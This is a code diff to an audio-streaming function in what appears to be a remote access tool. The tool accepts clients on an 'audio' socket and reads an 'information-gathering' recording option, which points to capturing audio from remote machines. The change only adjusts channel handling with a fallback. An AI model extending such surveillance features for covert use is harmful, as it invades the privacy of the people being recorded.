@@ -29,11 +29,15 @@ def audio_action(write_stream):
     CHUNK = 81920
     FORMAT = pyaudio.paInt16
     RATE = 44100
-    CHANNELS = p.get_default_output_device_info()['maxOutputChannels']
+    CHANNELS = 2
 
-    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
+    try:
+      stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
+    except:
+      CHANNELS = 1
+      stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
+      
     record = state['options']['information-gathering']['record']['audio']
-
     client, addr = state['sockets']['modules']['audio'][0].accept()
     client_obj = (client, username, addr)
     state['sockets']['modules']['audio'][1].append(client_obj)
